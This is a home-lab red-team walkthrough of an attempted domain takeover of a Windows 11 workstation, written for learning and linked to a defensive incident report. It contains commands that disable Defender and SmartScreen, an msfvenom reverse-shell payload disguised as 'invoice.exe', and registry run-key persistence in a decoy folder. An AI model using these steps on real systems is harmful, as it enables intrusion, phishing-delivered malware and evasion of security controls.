# Protocol For Domain Takeover (adversary perspective)

## Target Environment Assumptions
- Windows 11 workstation misconfigured at the install by a junior administrator with:
    - disabled real-time antivirus monitoring
    - ICMP allowed through a custom firewall policy
- Domain joined workstation with standard user privileges
- Running SMB on port 445

## Lab Configuration Notes
Following commands were used to simulate the configuration of the environment:
- `Set-MpPreference -DisableRealtimeMonitoring $true`
- `netsh advfirewall firewall add rule name="Allow ICMPv4" protocol=icmpv4:8,any dir=in action=allow`
- `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0`
- `netsh advfirewall firewall add rule name="Allow SMB" protocol=TCP dir=in localport=445 action=allow`
- `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"`
- `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0`
- `Set-MpPreference -DisableRealtimeMonitoring $true`
- `Set-MpPreference -DisableIOAVProtection $true`
- `Set-MpPreference -DisableScriptScanning $true`

## Scenario Context
- Attacker gained previous access onto our local network
- through a prior compromise like
    - phishing
    - credential theft of the Company VPN

## Reconnaissance
- We start by gathering information about our Target, in this case it would be a machine corresponding to the ip:192.168.1.10
- i will run an nmap scan to gather services that are up and their version, along with OS its running etc.
    - nmap -sV -sS -A -p- 192.168.1.10
![Nmap Result](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/nmap_scan.png)
- Information we gathered:
    - we have a hardened SMB2 with signing enabled and required running on port 445
        - SMB relay attacks are not viable due to signing requierements
    - couple of internal Windows services
    - Port 135 open running MSRPC, confirming its a Windows target
    - OS fingerprinted target as Windows 11 with 96% confidence
    - Single hop confirms direct LAN access

## Initial Access (TA0001)
- We craft a malicious reverse TCP shell, with help of Meterpreter
- Shell would listen on port 4444
- We generate the Payload using msfvenom:
    - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=4444 -f exe -o invoice.exe`
![MSFVENOM](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/msfvenom.png)
- I decided to use msfvenom in this instance, and not create my own tool, as it seemed more time efficient for my learning now
- To deliver payload we use a spear phishing email containing a malicious attachment disguised as legitimate invoice
    - Email appears to be a vendor payment request
    - Victim downloads and executes invoice.exe 
- Now we setup Metasploit listener
![Metasploit](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/metasploit.png)
- We wait until the target opens our malicious file
- After several tries of target trying to open our Payload, we get a successful connection
![Metasploit success](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/metasploitsuccess.png)
- We start with Enumeration
    - getuid
    - sysinfo
    - getprivs
![Enumeration](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/enumeration.png)
- What we found:
    - current user logged in LAB\user1 (standard domain user)
    - Machine is called TESTNAME1 joined to LAB domain
    - and current user only has standard priviledges, no administrative rights

## Persistence (TA0003)
- we try to create a scheduled task with our payload file
![schtask](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/schtask.png)
- as expected we get an error, we dont have the priveledges
- we try to run registry run key, which could run from user level
![registry run key](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/registry.png)
- Confirmed entry present alongside legitimate OneDrive startup entry
- To add a social engineering angle, we also create a new Deceptive Directory named "C:\Program File (x86)\Common FIles\System\UpdateChecker" and copy our payload there with changed name
![directory creation](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/folder_creation.png)
![file copy under new name](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/file_copy.png)
- afterwards we create another registry rule, so we have multiple possible persistence angles
![persistence v2](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/persistencev2.png)
- It maps to MITRE T1547.001 - Registry Run Keys / Startup Folder

## Privilege Escalation (TA0004)
- we try simplest escalation attempt
    - getsystem
- Meterpreter successfully escalated using technique 6
    - Named Pipe Impersonation via EFSRPC
    - EfsPotato abuses the Encrypting File System RPC Interface to impersonate the SYSTEM token via a named pipe
- We run getuid again to confirm we were escalated
- We are still logged as user1
![getsystem+getuid](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/get_sysuid.png)
- we background the session and run exploit suggester, to find out which exploits might work on this specific target
- After running suggested exploits, i found out that user1 is not in the admin groups so privilege escalation is unlikely
![user1 Groups](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/shell_groups.png)
- we can confirm that user1 is a standard domain user
- Member of BUILTIN\Users only
- has medium integrity level
- Local privilege escalation exhausted, pivoting to Credential Access techniques via domain attack surface

## Credential Access (TA0006)
- New idea - Kerberoasting
- We proceed with kiwi and kerberos ticket list
![kiwi and kerberos ticket list](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/kiwi_kerb.png)
- Attempted Kerberoasting via impacket-GetUserSPNs
    - no service accounts with SPNs found
    - Domain too minimal for such attack vector
- we run several other attempts
![impacket](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/impacket.png)

## Outcome
For this lab i decided to cut the scenarios after the Privilege Escalation as it proved to be too time consuming to only focus on Red Team part of the scenario. Beneficial for this lab would be the Blue Team Incident report, which is also included in this scenario
- Summary of the red team scenario:
    - established persistence
    - Successful enumeration
- This attack would include such steps as:
    - Token impersonation, in case an administrator privilege level user is also logged in on the machine
    - Kerberoasting against service accounts
    - or BloodHound mapped attack paths to Domain Admin
- The defensive analysis of this attack chain is available in the Incident Report for this lab

## MITRE ATT&CK Techniques Used
- T1566.001 - Spearphishing Attachment (Initial Access)
- T1204.002 - User Execution: Malicious File
- T1547.001 - Registry Run Keys / Startup Folder (Persistence)
- T1068 - Exploitation for Privilege Escalation
- T1558 - Steal or Forge Kerberos Tickets (Credential Access)
- T1021.002 - SMB/Windows Admin Shares (Lateral Movement attempt)
